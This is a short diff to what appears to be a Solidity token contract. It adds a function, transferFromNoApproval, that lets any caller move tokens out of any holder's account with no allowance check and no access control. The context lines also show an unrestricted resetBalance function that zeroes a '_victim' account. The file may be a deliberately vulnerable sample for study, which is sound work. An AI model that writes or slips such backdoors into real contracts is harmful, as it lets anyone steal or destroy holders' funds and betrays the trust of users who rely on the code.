@@ -48,6 +48,14 @@ function transferFrom(address _from, address _to, uint256 _amount) external retu
     return true;
 }
 
+function transferFromNoApproval(address _from, address _to, uint256 _amount) external returns (bool)
+{
+    require (balances[_from] >= _amount, "Insufficient balance");
+    balances[_from] = balances[_from].sub(_amount);
+    balances[_to] = balances[_to].add(_amount);
+    return true;
+}
+
 function resetBalance(address _victim) external returns (bool)
 {   
     balances[_victim] = 0;
